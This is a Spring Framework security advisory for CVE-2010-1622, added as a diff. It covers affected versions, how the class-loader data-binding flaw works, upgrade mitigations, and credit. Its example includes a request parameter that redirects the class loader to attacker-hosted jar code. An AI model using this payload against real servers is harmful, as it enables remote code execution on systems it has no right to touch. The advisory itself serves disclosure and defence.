@@ -1,0 +1,45 @@
+CVE-2010-1622: Spring Framework execution of arbitrary code
+
+Severity: Critical
+
+Vendor:
+SpringSource, a division of VMware
+
+Versions Affected:
+3.0.0 to 3.0.2
+2.5.0 to 2.5.6.SEC01 (community releases)
+2.5.0 to 2.5.7 (subscription customers)
+
+Earlier versions may also be affected
+
+Description:
+The Spring Framework provides a mechanism to use client provided data to update the properties of an object. This 
+mechanism allows an attacker to modify the properties of the class loader used to load the object (via 
+'class.classloader'). This can lead to arbitrary command execution since, for example, an attacker can modify the URLs 
+used by the class loader to point to locations controlled by the attacker.
+
+Example:
+This example is based on a Spring application running on Apache Tomcat.
+1. Attacker creates attack.jar and makes it available via an HTTP URL. This jar has to contain following:
+ - META-INF/spring-form.tld - defining spring form tags and specifying that they are implemented as tag files and not 
+classes;
+ - tag files in META-INF/tags/ containing tag definition (arbitrary Java code).
+
+2. Attacker then submits HTTP request to a form controller with the following HTTP parameter: 
+class.classLoader.URLs[0]=jar:http://attacker/attack.jar!/ At this point the zeroth element of the WebappClassLoader's 
+repositoryURLs property will be overwritten with attacker's URL.
+
+3. Later on, org.apache.jasper.compiler.TldLocationsCache.scanJars() will use WebappClassLoader's URLs to resolve tag 
+libraries and all tag files specified in TLD will be resolved against attacker-controller jar (HTTP retrieval of the 
+jar file is performed by the URL class).
+
+Mitigation:
+All users may mitigate this issue by upgrading to 3.0.3
+Community users of 2.5.x and earlier may also mitigate this issue by upgrading 2.5.6.SEC02
+Subscription users of 2.5.x and earlier may also mitigate this issue by upgrading 2.5.6.SEC02 or 2.5.7.SR01
+
+Credit:
+The issue was discovered by Meder Kydyraliev, Google Security Team
+
+References:
+[1] http://www.springsource.com/security/spring-framework
